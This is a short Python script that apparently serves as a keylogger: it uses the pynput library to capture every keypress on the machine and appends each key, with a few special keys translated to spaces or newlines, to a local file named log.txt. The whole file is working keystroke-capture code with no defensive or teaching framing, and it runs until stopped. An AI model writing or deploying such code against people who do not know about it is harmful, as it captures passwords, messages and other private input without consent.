import pynput
from pynput.keyboard import Listener # type: ignore


def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ' '
    if letter == "Key.ctrl_l":
        letter = " "
    if letter == "Key.enter":
        letter = "\n"
    if letter == "Key.f1":
        letter = " f1 pressed"

    with open("log.txt", 'a') as f:
        f.write(letter)

# Collecting events until stopped

with Listener(on_press=write_to_file) as l:
    l.join()


